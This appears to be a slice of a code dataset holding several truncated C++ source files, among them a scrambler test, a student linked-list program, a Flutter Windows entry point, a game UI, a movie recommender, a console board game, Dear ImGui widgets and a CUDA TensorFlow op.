0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0,\n    1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0,\n    1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0\n};\n\nboost::ut::suite AdditiveScramblerTests = [] {\n    using namespace boost::ut;\n    using namespace gr;\n    using namespace gr::packet_modem;\n\n    \"additive_scrambler_ccsds\"_test = [] {\n        Graph fg;\n        constexpr auto num_items = 100000_ul;\n        auto& source = fg.emplaceBlock<RandomSource<uint8_t>>(\n            { { \"minimum\", uint8_t{ 0 } },\n              { \"maximum\", uint8_t{ 1 } },\n              { \"num_items\", static_cast<size_t>(num_items) },\n              { \"repeat\", false } });\n        auto& input_sink = fg.emplaceBlock<VectorSink<uint8_t>>();\n        auto& scrambler =\n            fg.emplaceBlock<AdditiveScrambler<uint8_t>>({ { \"mask\", uint64_t{ 0xA9 } },\n                                                          { \"seed\", uint64_t{ 0xFF } },\n                                                          { \"length\", uint64_t{ 7 } } });\n        auto& output_sink = fg.emplaceBlock<VectorSink<uint8_t>>();\n        expect(eq(ConnectionResult::SUCCESS,\n                  fg.connect<\"out\">(source).to<\"in\">(input_sink)));\n        expect(\n            eq(ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(scrambler)));\n        expect(eq(ConnectionResult::SUCCESS,\n                  fg.connect<\"out\">(scrambler).to<\"in\">(output_sink)));\n        scheduler::Simple sched{ std::move(fg) };\n        expect(sched.runAndWait().has_value());\n        const auto input_data = input_sink.data();\n        expect(eq(input_data.size(), num_items));\n        const auto output_data = output_sink.data();\n        expect(eq(output_data.size(), num_items));\n        for (size_t j = 0; j < static_cast<size_t>(num_items); ++j) {\n            expect(\n                eq(output_data[j], input_data[j] ^ ccsds_scrambling_sequence[j % 255]));\n        }\n    };\n\n    // test for the new CCSDS scrambler defined in CCSDS 131.0-B-5 (September 2023)\n    \"additive_scrambler_ccsds_2023\"_test = [] {\n        Graph fg;\n        const std::vector<uint8_t> expected = { 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0,\n                                                0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1,\n                                                1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1 };\n        const std::vector<uint8_t> v(expected.size());\n        auto& source = fg.emplaceBlock<VectorSource<uint8_t>>();\n        source.data = v;\n        auto& scrambler =\n            fg.emplaceBlock<AdditiveScrambler<uint8_t>>({ { \"mask\", uint64_t{ 0x4001 } },\n                                                          { \"seed\", uint64_t{ 0x18E38 } },\n                                                          { \"length\", uint64_t{ 16 } } });\n        auto& sink = fg.emplaceBlock<VectorSink<uint8_t>>();\n        expect(\n            eq(ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(scrambler)));\n        expect(\n            eq(ConnectionResult::SUCCESS, fg.connect<\"out\">(scrambler).to<\"in\">(sink)));\n        scheduler::Simple sched{ std::move(fg) };\n        expect(sched.runAndWait().has_value());\n        expect(eq(sink.data(), expected));\n    };\n\n    \"additive_scrambler_reset\"_test = [] {\n        Graph fg;\n        constexpr auto num_items = 100000_ul;\n        constexpr auto num_reset = 100_ul;\n        auto& source = fg.emplaceBlock<NullSource<uint8_t>>();\n        auto& head = fg.emplaceBlock<Head<uint8_t>>(\n            { { \"num_items\", static_cast<uint64_t>(num_items) } });\n        auto& add_tags = fg.emplaceBlock<StreamToTaggedStream<uint8_t>>(\n            { { \"packet_length\", static_cast<uint64_t>(num_reset) } });\n        auto& scrambler = fg.emp",
    "#include <iostream>\nusing namespace std;\nstruct Node \n{\n    int noMhs;\n    string name;\n    Node *next;\n    Node *prev;\n};\n\nNode *START = NULL;\n\nvoid addNode()\n{\n    Node *newNode = new Node();\n    cout << \"\\nenter the roll number of the student: \";\n    cin >> newNode->noMhs;\n    cout << \"\\nEnter the name of student: \";\n    cin >> newNode->name;\n\n    if (START == NULL || newNode->noMhs <= START->noMhs)\n    {\n        if (START != NULL && newNode-> noMhs == START->noMhs)\n        {\n            cout << \"\\033[31mDuplicate roll numbers not allowed\\033[0m\" << endl;\n            return;\n        }\n        newNode->next = START;\n        if (START != NULL)\n        {\n            START ->prev = newNode;\n        }\n        newNode->prev = NULL;\n        START = newNode;\n    }\n    else\n    {\n        Node *current = START;\n        Node *previous = NULL;\n\n        while (current != NULL && current->noMhs < newNode->noMhs)\n        {\n            previous = current;\n            current = current->next;\n        }\n        newNode->next = current;\n        newNode->prev = previous;\n\n        if (current != NULL)\n        {\n            current->prev = newNode;\n        }\n        if (previous != NULL)\n        {\n            previous->next = newNode;\n        }\n        else\n        {\n            START = newNode;\n        }\n    }\n}\nbool search(int rollNo, Node **previous, Node **current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = *current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\nvoid deleteNode()\n{\n    Node *previous, *current;\n    int rollNo;\n\n    cout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n    cin >> rollNo;\n\n    if (START == NULL)\n    {\n        cout << \"List is empty\" << endl;\n        return;\n    }\n    current = START;\n    previous = NULL;\n\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        previous = current;\n        current = current->next;\n    }\n\n    if (current == NULL)\n    {\n        cout << \"\\033[31mThe reocrg with roll number \" << rollNo << \"not found\\033[0m\" << endl;\n        return;\n    }\n\n    if (current == START)\n    {\n        START = START->next;\n        if (START != NULL)\n        {\n            START->prev = NULL;\n        }\n    }\n    else \n    {\n        previous->next = current->next;\n        if (current->next != NULL)\n        {\n            current->next->prev = previous;\n        }\n    }\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number \" << rollNo << \"deleted\\x1b[0m\" << endl;\n}\nbool listEmpty()\n{\n    return (START == NULL);\n}\nvoid traverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in ascending order of roll number are: \" << endl;\n        Node *currentNode = START;\n        while (currentNode != NULL)\n        {\n            cout << currentNode-> noMhs << \" \" << currentNode->name << endl;\n            currentNode = currentNode->next;\n        }\n    }\n}\nvoid revtraverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in descending order of roll number are: \" << endl;\n        Node *currentNode = START;\n        while (currentNode->next != NULL)\n            currentNode = currentNode->next;\n\n        while (currentNode != NULL)\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;\n            currentNode = currentNode->prev;\n        }\n    }      \n}\nvoid searchData()\n{\n    if (listEmpty() == true)\n    {\n        cout << \"\\nList is empty\" << endl;\n    }\n    Node *prev, *curr;\n    prev = curr = NULL;\n    cout << \"\\nEnter the roll number of the student whoose record you want to search: \";\n    int num;\n    cin >> num;\n    if (search(num, &prev, &curr) == false)\n        cout << \"\\nRecord not found\" << endl;\n    else\n    {\n        cout << \"\\nRecord found\" << endl;\n        cout << \"\\nRoll number: \" << curr->noMhs << endl;\n        cout << \"\\nName: \" << curr->name << endl;\n    } \n}\nint main()\n{\n    while (true)\n    {\n        try\n        {\n            cout << \"\\nMenu\" << endl;\n            cout << \"1. Add a record to the list\" << endl;\n            cout << \"2. delete a recorf to the list\" << endl;\n            cout << \"3. View all records in the ascending order of roll numbers\" << endl;\n            cout << \"4. View all records in the descending order of roll numbers\" << endl;\n            cout << \"5. search for a record in the list\" << endl;\n            cout << \"6. Exit\" << endl;\n            cout << \"\\nEnter your choice (1-6): \";\n            char ch;\n            cin >> ch;\n\n            switch (ch)\n            {\n                case '1':\n                    addNode();\n                    break;\n                case '2':\n                    deleteNode();\n                    break;\n                case '3':\n                    traverse();\n                    break;\n                case '4':\n                  ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"fastfood6\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//\n// Created by caowei on 2024/4/29.\n//\n\n#include \"game_ui.h\"\n\n// \u521d\u59cb\u5316\nSubWidget::SubWidget(int width, int height, Color fillColor, BlockBoard mode) {\n    // \u77e9\u5f62\u56fe\u5757\n    this->blockWidth = width;\n    this->blockHeight = height;\n    this->fontSize = this->blockHeight * 0.5;\n    this->subImg.Resize(width, height);\n    SetWorkingImage(&this->subImg);\n    setfillcolor(fillColor);\n    if (mode == BlockBoard::on)\n        rectangle(0, 0, width, height);\n    else\n        solidrectangle(0, 0, width, height);\n}\nSubWidget::SubWidget(int radius, Color fillColor, BlockBoard mode) {\n    // \u5706\u5f62\u56fe\u5757\n    this->blockWidth = radius;\n    this->blockHeight = radius;\n    this->subImg.Resize(radius, radius);\n    SetWorkingImage(&this->subImg);\n    setfillcolor(fillColor);\n    if (mode == BlockBoard::on)\n        circle(radius, radius, radius);\n    else\n        solidcircle(radius, radius, radius);\n}\n\nIMAGE SubWidget::getImg() {\n    return this->subImg;\n}\nint SubWidget::getWidth() {\n    return this->blockWidth;\n}\nint SubWidget::getHeight() {\n    return this->blockHeight;\n}\nDWORD *SubWidget::getImgBuffer() {\n    return GetImageBuffer(&this->subImg);\n}\n\n// \u6587\u672c\u8bbe\u7f6e\nvoid SubWidget::setFontsize(int fontsize) {\n    this->fontSize = fontsize;\n}\nvoid SubWidget::setText(std::string text, TextPosition txtPos) {\n    // \u6dfb\u52a0\u6587\u672c\n    SetWorkingImage(& this->subImg);\n    settextstyle(this->fontSize, 0, \"Forte\");\n    settextcolor(RGB(0 ,0, 0));\n    setbkmode(TRANSPARENT);\n    int txtWidth = textwidth(text.c_str());\n    int txtHeight = textheight(text.c_str());\n    int centerX = (this->blockWidth - txtWidth) / 2;\n    int centerY = (this->blockHeight - txtHeight) / 2;\n    switch (txtPos) {\n        case center:\n            outtextxy(centerX, centerY, text.c_str());\n            break;\n        case left:\n            outtextxy(0, centerY, text.c_str());\n            break;\n        case right:\n            outtextxy(this->blockWidth - txtWidth, centerY, text.c_str());\n            break;\n        case top:\n            outtextxy(centerX, 0, text.c_str());\n            break;\n        case bottom:\n            outtextxy(centerX, this->blockHeight - txtHeight, text.c_str());\n            break;\n        case leftTop:\n            outtextxy(0, 0, text.c_str());\n            break;\n        case leftBottom:\n            outtextxy(0, this->blockHeight - txtHeight, text.c_str());\n            break;\n        case rightTop:\n            outtextxy(this->blockWidth - txtWidth, 0, text.c_str());\n            break;\n        case rightBottom:\n            outtextxy(this->blockWidth - txtWidth, this->blockHeight - txtHeight, text.c_str());\n        case halfTop:\n            outtextxy(centerX, centerY - this->blockHeight / 4, text.c_str());\n        default:\n            break;\n    }\n}\n\nvoid SubWidget::setPosition(int x, int y) {\n    SetWorkingImage();\n    putimage(x, y, &this->subImg);\n}\n\n// \u754c\u9762\u76f8\u5173\u51fd\u6570\nbool checkSign(int m, std::vector<int> signArr) {\n    for (auto sign : signArr) {\n        if (m == sign)\n            return true;\n    }\n    return false;\n}",
    "\n#include \"RecommendationSystem.h\"\n#include <memory>\n#include <vector>\n#include <cmath>\n#include <algorithm>\n#include <limits>\n\nstd::ostream &operator<< (std::ostream &os, RecommendationSystem &recSystem)\n{\n  for (const auto &movie: recSystem.movies_set_1)\n  {\n\tos << *movie;\n  }\n  return os;\n}\n\n/**\n * Calculates the Euclidean norm (magnitude) of a given vector.\n *\n * @param vec The input vector for which the norm is calculated.\n * @return The Euclidean norm of the input vector.\n */\ndouble RecommendationSystem::calc_norm (const std::vector<double> &vec)\n{\n  double sum_of_squares = 0.0;\n  for (const double &element: vec)\n  {\n\tsum_of_squares += element * element;\n  }\n  \n  return std::sqrt (sum_of_squares);\n}\n\n/**\n * Calculates the scalar product (dot product) of two given vectors.\n *\n * @param vec1 The first input vector.\n * @param vec2 The second input vector.\n * @return The scalar product (dot product) of the two input vectors.\n */\ndouble RecommendationSystem::calc_scalar_product\\\n(const std::vector<double> &vec1, const\nstd::vector<double> &vec2)\n{\n  double dot_product = 0.0;\n  for (std::size_t i = 0; i < vec1.size (); i++)\n  {\n\tdot_product += vec1[i] * vec2[i];\n  }\n  return dot_product;\n}\n\n\nRecommendationSystem::RecommendationSystem () = default;\n\nsp_movie RecommendationSystem::add_movie (const std::string &name, int year,\n\t\t\t\t\t\t\t\t\t\t  const\n\t\t\t\t\t\t\t\t\t\t  std::vector<double> &features)\n{\n  sp_movie smart_ptr_movie = std::make_shared<Movie> (name, year);\n  movie_key movie_key_1 = std::make_pair (name, year);\n  movie_value movie_value_1 = std::make_pair (smart_ptr_movie, features);\n  rec_system_ptr[movie_key_1] = movie_value_1;\n  movies_set_1.insert (smart_ptr_movie);\n  \n  return smart_ptr_movie;\n  \n}\n\nsp_movie RecommendationSystem::get_movie (const std::string &name, int year)\n{\n  movie_key key = std::make_pair (name, year);\n  \n  if (rec_system_ptr.count (key) == 0)\n  {\n\treturn nullptr;\n  }\n  return rec_system_ptr[key].first;\n}\n\n\n\nsp_movie RecommendationSystem::recommend_by_content (const User &user){\n  rank_map user_rank_map = user.get_ranks ();\n  double sum = 0;\n  double quantity = 0;\n  for (const auto &elem: user_rank_map){\n\tsum += elem.second;\n\tquantity++;\n  }\n  double mean = sum / quantity;\n  size_t size = 0;\n  std::vector<double> pref_vector (size, 1);\n  for (const auto &elem: user_rank_map){\n\tif (user_rank_map.count (elem.first) > 0){\n\t  double normalized = elem.second - mean;\n\t  movie_key movie_key_1 = std::make_pair (elem.first->get_name (), elem\n\t\t  .first->get_year ());\n\t  size = rec_system_ptr[movie_key_1].second.size ();\n\t  pref_vector.resize (size);\n\t  std::vector<double> pref_vec_for_cur_movie = \\\n          rec_system_ptr[movie_key_1].second;\n\t  for (std::size_t i = 0; i < pref_vec_for_cur_movie.size (); i++){\n\t\tpref_vector[i] =\n\t\t\tpref_vector[i] + pref_vec_for_cur_movie[i] * normalized;\n\t  }\n\t}\n  }\n  double max_rank = -std::numeric_limits<double>::infinity ();\n  movie_key best_movie;\n  for (const auto &movie_elem: rec_system_ptr){\n\tsp_movie movie_ptr = movie_elem.second.first;\n\tif (user_rank_map.count (movie_ptr) == 0){\n\t  movie_key movie_key_1 = std::make_pair (movie_ptr->get_name (),\\\n\t\t\t\t\t\t\t\t\t\t\t  movie_ptr->get_year ());\n\t  std::vector<double> pref_vec_for_cur_movie = \\\n          rec_system_ptr[movie_key_1].second;\n\t  double pref_vec_norm = calc_norm (pref_vector);\n\t  double pref_vec_for_cur_movie_norm = calc_norm \\\n\t\t  (pref_vec_for_cur_movie);\n\t  double scalar_prod = calc_scalar_product (pref_vector,\n\t\t\t\t\t\t\t\t\t\t\t\tpref_vec_for_cur_movie);\n\t  double cur_rank = scalar_prod / (pref_vec_norm *\n\t\t\t\t\t\t\t\t\t   pref_vec_for_cur_movie_norm);\n\t  if (cur_rank > max_rank){\n\t\tmax_rank = cur_rank;\n\t\tbest_movie = movie_key_1;\n\t  }\n\t}\n  }\n  return rec_system_ptr[best_movie].first;\n}\n\n/**\n * Compare function for sorting pairs based on the second element in\n * descending order.\n *\n * @param p1 The first pair to compare.\n * @param p2 The second pair to compare.\n * @return `true` if the second element of `p1` is greater than the second\n * element of `p2`, `false` otherwise.\n */\nbool RecommendationSystem::compare_second (const\nstd::pair<std::shared_ptr<Movie>, double> &p1,\n\t\t\t\t\t const std::pair<std::shared_ptr<Movie>, double> &p2)\n{\n  return p1.second > p2.second;\n}\n\ndouble RecommendationSystem::predict_movie_score (const User &user, const\nsp_movie &movie, int k)\n{\n  rank_map user_rank_map = user.get_ranks ();\n  std::vector<std::pair<sp_movie, double>> similarity_of_movies;\n  \n  movie_key movie_key_1 = std::make_pair (movie->get_name (),\n\t\t\t\t\t\t\t\t\t\t  movie->get_year ());\n  std::vector<double> chosen_m_movie = rec_system_ptr[movie_key_1].second;\n  for (const auto &elem: user_rank_map)\n  {\n\tif (user_rank_map.count (elem.first) > 0)\n\t{\n\t  movie_key movie_key_2 = std::make_pair (elem.first->get_name (), elem\n\t\t  .first->get_year ());\n\t  std::vector<double> pref_vec_for_cur_movie =\n\t\t  rec_system_ptr[movie_key_2].second;\n\t  double m_movie_vec_norm = calc_norm (chosen_m_movie);\n\t  double pref_vec_for_cur_movie_norm = calc",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <conio.h> \n#include <stdio.h>\n#include <stdlib.h>\n#include <windows.h>\n#include <string.h>\n#include <string>\n\n#define PLAYER1_SYM '1'\n#define PLAYER2_SYM '2'\n#define BLANK       '-'\n\nusing namespace std;\n\nvoid openingRoll(int* whoStarts);\nvoid setPawnsDefault(struct GameState* gameState);\nvoid printMenu(struct GameState* gameState);\nvoid printFieldHighlights(int x, bool highlight[24]);\nvoid printBoard(struct GameState* gameState, bool highlight[24]);\nvoid fieldDecryption(int* field);\nint getNumericInput(struct GameState* gameState, int field, int pawn, bool highlight[24], int whoStarts);\nvoid clearScreen();\nvoid highlightFields(char x, struct GameState* gameState, bool highlight[24]);\nvoid undoHighlight(char x, struct GameState* gameState, bool highlight[24]);\nvoid saveGameState(const char* filename, struct GameState* gameState);\nvoid loadGameState(const char* filename, struct GameState* gameState);\nint isFileEmpty(const char* filename, struct GameState* gameState);\nvoid ifDeadPawns(int field, int pawn, struct GameState* gameState, bool highlight[24], int whoStarts);\nint rollingDie(struct GameState* gameState);\nvoid endingMove(int field, int pawn, struct GameState* gameState, bool highlight[24], int nextPlayer, int whoStarts);\nint pawnInput(int player, string board, struct GameState* gameState, int pawn, int field);\nint enterFieldNumber(int field, struct GameState* gameState, bool highlight[24], int pawn, int whoStarts);\nvoid endGame(struct GameState* gameState);\nvoid playerMovement(int field, int pawn, struct GameState* gameState, bool highlight[24], int whoStarts);\nvoid printMenuChoice();\nint getInput();\nvoid entryMenuChoice(int field, int pawn, struct GameState* gameState, bool highlight[24], int whoStarts);\n\nstruct GameState {\n    char topBoard[12][5];\n    char bottomBoard[12][5];\n    int whoseTurn;\n    int p1DeadPawns;\n    int p2DeadPawns;\n    int p1BornPawns;\n    int p2BornPawns;\n};\n\nvoid openingRoll(int* whoStarts) {\n    int rollOne = rand() % 6 + 1;\n    int rollTwo = rand() % 6 + 1;\n    if (rollOne > rollTwo) {\n        (*whoStarts) = 1;\n    }\n    else if (rollOne == rollTwo) {\n        openingRoll(whoStarts);\n    }\n    else {\n        (*whoStarts) = 2;\n    }\n}\n\nvoid setPawnsDefault(struct GameState* gameState) {\n    gameState->p1DeadPawns = 0;\n    gameState->p2DeadPawns = 0;\n    gameState->p1BornPawns = 0;\n    gameState->p2BornPawns = 0;\n    //two dimensional array\n    for (int j = 0; j < 5; j++) {\n        for (int i = 0; i < 12; i++) {\n            gameState->topBoard[i][j] = BLANK;\n            if (i == 0 || (i == 11 && j < 2)) {\n                gameState->topBoard[i][j] = PLAYER1_SYM;\n            }\n            if ((i == 4 && j < 3) || i == 6) {\n                gameState->topBoard[i][j] = PLAYER2_SYM;\n            }\n        }\n    }\n    printf(\"\\n\");\n    for (int j = 0; j < 5; j++) {\n        for (int i = 0; i < 12; i++) {\n            gameState->bottomBoard[i][j] = BLANK;\n            if (i == 0 || (i == 11 && j > 2)) {\n                gameState->bottomBoard[i][j] = PLAYER2_SYM;\n            }\n            if ((i == 4 && j > 1) || i == 6) {\n                gameState->bottomBoard[i][j] = PLAYER1_SYM;\n            }\n        }\n    }\n}\n\nvoid printMenu(struct GameState* gameState) {\n    printf(\"     PRESS [S] AND ENTER TO SAVE GAME STATE   \\n\");\n    printf(\"  --------------------------------------------\\n\");\n    printf(\"  > PLA1 - bornPawns: [%d] - deadPawns: [%d] <\\n\\n\", gameState->p1BornPawns, gameState->p1DeadPawns);\n    printf(\"  > PLA2 - bornPawns: [%d] - deadPawns: [%d] <\\n\", gameState->p2BornPawns, gameState->p2DeadPawns);\n    printf(\"  --------------------------------------------\\n\\n\");\n}\n\nvoid printFieldHighlights(int x, bool highlight[24]) {\n    if (x == 1) {\n        printf(\"  \");\n        for (int i = 0; i <= 5; i++) {\n            if (highlight[i] == true) {\n                printf(\"  #\");\n            }\n            else {\n                printf(\"   \");\n            }\n        }\n        printf(\"     \");\n        for (int i = 6; i <= 11; i++) {\n            if (highlight[i] == true) {\n                printf(\"  #\");\n            }\n            else {\n                printf(\"   \");\n            }\n        }\n        printf(\" \\n\");\n    }\n\n    else if (x == 2) {\n        printf(\"\\n  \");\n        for (int i = 12; i <= 17; i++) {\n            if (highlight[i] == true) {\n                printf(\"  #\");\n            }\n            else {\n                printf(\"   \");\n            }\n        }\n        printf(\"     \");\n        for (int i = 18; i <= 23; i++) {\n            if (highlight[i] == true) {\n                printf(\"  #\");\n            }\n            else {\n                printf(\"   \");\n            }\n        }\n        printf(\" \\n\");\n    }\n}\n\nvoid printBoard(struct GameState* gameState, bool highlight[24]) {\n    printMenu(gameState);\n    printFieldHighlights(1, highlight);\n    printf(\"   13 14 15 16 17 18      19 20 21 22 23 24  \\n\");//3 5 1; every number print sp",
    "// dear imgui, v1.90.6 WIP\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: Typing-Select support\n// [SECTION] Widgets: Multi-Select support\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n\n// System includes\n#include <stdint.h>     // intptr_t\n\n//-------------------------------------------------------------------------\n// Warnings\n//-------------------------------------------------------------------------\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#pragma clang diagnostic ignored \"-Wunsafe-buffer-usage\"            // warning: 'xxx' is an unsafe pointer used for buffer access\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                          // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"   ",
    "\r\n#include \"GlobalToUVSpaceGPUOp.h\"\r\n\r\n//==============================================================================================//\r\n\r\nREGISTER_OP(\"GlobalToUVSpaceGpu\")\r\n\r\n.Input(\"vertex_positions: float\")\r\n.Input(\"ray_points: float\")\r\n.Input(\"ray_dirs: float\")\r\n.Input(\"ray_origin: float\")\r\n\r\n.Output(\"uvd: float\")\r\n\r\n.Attr(\"mesh_file_path: string = 'None'\")\r\n.Attr(\"number_of_rays: int = 0\")\r\n.Attr(\"padding: float = 0.0\");\r\n\r\n//==============================================================================================//\r\n\r\nextern \"C\" void computeGlobalToUVSpaceGPUOpGPU(GlobalToUVSpaceGPUOpData& data);\r\n\r\n//==============================================================================================//\r\n\r\nGlobalToUVSpaceGPUOp::GlobalToUVSpaceGPUOp(OpKernelConstruction* context)\r\n\t:\r\n\tOpKernel(context)\r\n{\r\n\tOP_REQUIRES_OK(context, context->GetAttr(\"mesh_file_path\", &meshFilePath));\r\n\tOP_REQUIRES(context, meshFilePath != std::string(\"None\"), errors::InvalidArgument(\"mesh_file_path not set!\", meshFilePath));\r\n\tOP_REQUIRES_OK(context, context->GetAttr(\"padding\", &data.padding));\r\n\tOP_REQUIRES_OK(context, context->GetAttr(\"number_of_rays\", &data.numberOfBatches));\r\n\r\n\t//misc\r\n\tmesh = new trimesh(meshFilePath.c_str(), true, false);\r\n\tdata.numberOfVertices = mesh->N;\r\n\tdata.d_textureCoordinates = mesh->d_textureCoordinates;\r\n\tdata.maxFacesAttached = 1024;\r\n\tdata.maxHitPoints = 20;\r\n\tdata.d_numNeighbours = mesh->d_numNeighbours;\r\n\tdata.d_neighbourIdx = mesh->d_neighbourIdx;\r\n\tdata.d_neighbourOffset = mesh->d_neighbourOffset;\r\n\tdata.d_restVertexPositions = mesh->d_vertices;\r\n\tdata.d_segmentation = mesh->d_segmentation;\r\n\r\n\t/////////////////////////////////////////////////////////////////////////\r\n\r\n\tstd::vector<int>faces;\r\n\tfor (int f = 0; f < mesh->F; f++)\r\n\t{\r\n\t\tfaces.push_back(mesh->getFace(f).index[0]);\r\n\t\tfaces.push_back(mesh->getFace(f).index[1]);\r\n\t\tfaces.push_back(mesh->getFace(f).index[2]);\r\n\t}\r\n\r\n\tif (faces.size() % 3 == 0)\r\n\t{\r\n\t\tstd::vector<int> vertexFaces, vertexFacesId;\r\n\t\tgetVertexFaces(mesh->N, faces, vertexFaces, vertexFacesId);\r\n\r\n\t\tdata.F = mesh->F;\r\n\t\tcutilSafeCall(cudaMalloc(&data.d_facesVertex, sizeof(int3) * data.F));\r\n\t\tcutilSafeCall(cudaMemcpy(data.d_facesVertex, faces.data(), sizeof(int3)*data.F, cudaMemcpyHostToDevice));\r\n\r\n\t\tcutilSafeCall(cudaMalloc(&data.d_hitDepths, sizeof(float) * 